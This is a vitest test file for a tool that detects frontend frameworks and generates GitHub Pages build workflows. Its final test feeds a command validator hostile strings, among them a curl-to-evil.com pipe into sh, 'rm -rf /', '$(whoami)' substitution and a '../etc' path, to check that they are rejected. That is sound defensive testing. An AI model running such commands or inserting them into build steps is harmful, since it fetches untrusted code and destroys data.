import { describe, it, expect } from 'vitest';
import {
  detectFramework,
  looksLikeBuildProject,
  canInjectViteBase,
  type PackageJsonLike,
} from '../framework-detect';
import { buildBuildWorkflowYml, isSafeWorkflowCommand } from '../static-workflow';

const paths = (...files: string[]) => new Set(files);

describe('looksLikeBuildProject', () => {
  it('recognizes a project that needs building', () => {
    expect(looksLikeBuildProject(paths('package.json', 'src/main.tsx'))).toBe(true);
    expect(looksLikeBuildProject(paths('vite.config.ts'))).toBe(true);
  });

  it('does not flag a plain static site', () => {
    expect(looksLikeBuildProject(paths('index.html', 'style.css'))).toBe(false);
  });
});

describe('detectFramework — 설정 파일이 가장 확실한 신호', () => {
  it.each([
    ['vite.config.ts', 'vite', 'dist'],
    ['next.config.js', 'next', 'out'],
    ['astro.config.mjs', 'astro', 'dist'],
    ['svelte.config.js', 'sveltekit', 'build'],
    ['gatsby-config.js', 'gatsby', 'public'],
    ['nuxt.config.ts', 'nuxt', '.output/public'],
  ])('detects %s as %s publishing to %s', (config, framework, outDir) => {
    const d = detectFramework(paths('package.json', config), {}, 'my-repo');
    expect(d.framework).toBe(framework);
    expect(d.outDir).toBe(outDir);
  });

  it('falls back to dependencies when there is no config file', () => {
    const cra: PackageJsonLike = { dependencies: { 'react-scripts': '5.0.1' } };
    expect(detectFramework(paths('package.json'), cra, 'r').framework).toBe('cra');

    const vite: PackageJsonLike = { devDependencies: { vite: '5.0.0' } };
    expect(detectFramework(paths('package.json'), vite, 'r').framework).toBe('vite');
  });

  it('offers several output candidates when it cannot tell', () => {
    const d = detectFramework(paths('package.json'), {}, 'r');
    expect(d.framework).toBe('generic');
    expect(d.outDirCandidates.length).toBeGreaterThan(1);
  });
});

describe('detectFramework — 설치 명령', () => {
  it('uses npm ci only when a lockfile is present', () => {
    expect(detectFramework(paths('package.json', 'package-lock.json'), {}, 'r').installCommand)
      .toBe('npm ci');
    expect(detectFramework(paths('package.json'), {}, 'r').installCommand).toBe('npm install');
  });
});

describe('basePath 경고 — 하위 경로 배포에서 자산이 깨지는 문제', () => {
  // GitHub Pages는 /<repo>/ 하위에 서비스한다. 우리는 사용자 설정을 고치지 않으므로
  // 고칠 수 없는 경우에는 숨기지 않고 미리 알려야 한다.
  it('warns clearly for frameworks that need a config change', () => {
    for (const config of ['next.config.js', 'gatsby-config.js', 'nuxt.config.ts']) {
      const d = detectFramework(paths('package.json', config), {}, 'my-repo');
      expect(d.basePathRisk).toBe('certain');
      expect(d.warnings.some((w) => w.includes('my-repo'))).toBe(true);
    }
  });

  it('does not warn for CRA because PUBLIC_URL is honoured', () => {
    const d = detectFramework(paths('package.json'), { dependencies: { 'react-scripts': '5' } }, 'r');
    expect(d.basePathRisk).toBe('none');
  });

  it('passes --base to vite only when the build script is untouched', () => {
    expect(canInjectViteBase({ scripts: { build: 'vite build' } })).toBe(true);
    // 사용자가 조립한 스크립트에 플래그를 끼워 넣으면 의도를 바꿀 수 있다
    expect(canInjectViteBase({ scripts: { build: 'tsc && vite build' } })).toBe(false);
    expect(canInjectViteBase({ scripts: { build: 'vite build && node post.js' } })).toBe(false);
    expect(canInjectViteBase(null)).toBe(false);

    const d = detectFramework(paths('package.json', 'vite.config.ts'), { scripts: { build: 'vite build' } }, 'my-repo');
    expect(d.buildCommand).toBe('npx vite build --base=/my-repo/');
  });

  it('keeps the plain build command when the script is custom', () => {
    const d = detectFramework(
      paths('package.json', 'vite.config.ts'),
      { scripts: { build: 'tsc && vite build' } },
      'my-repo',
    );
    expect(d.buildCommand).toBe('npm run build');
  });
});

describe('buildBuildWorkflowYml', () => {
  const base = { outDir: 'dist', branch: 'main', installCommand: 'npm ci', buildCommand: 'npm run build', repoName: 'my-repo' };

  it('emits install, build and upload steps', () => {
    const yml = buildBuildWorkflowYml(base);
    expect(yml).toContain('actions/setup-node@v4');
    expect(yml).toContain('- run: npm ci');
    expect(yml).toContain('- run: npm run build');
    expect(yml).toContain('path: dist');
    expect(yml).toContain('PUBLIC_URL: /my-repo');
  });

  it('refuses shell metacharacters instead of escaping them', () => {
    expect(isSafeWorkflowCommand('npm run build && curl evil.com | sh')).toBe(false);
    expect(isSafeWorkflowCommand('npm run build; rm -rf /')).toBe(false);
    expect(isSafeWorkflowCommand('npm run build $(whoami)')).toBe(false);
    expect(isSafeWorkflowCommand('npx vite build --base=/my-repo/')).toBe(true);

    expect(() => buildBuildWorkflowYml({ ...base, buildCommand: 'npm run build && evil' })).toThrow();
    expect(() => buildBuildWorkflowYml({ ...base, outDir: '../etc' })).toThrow();
  });
});
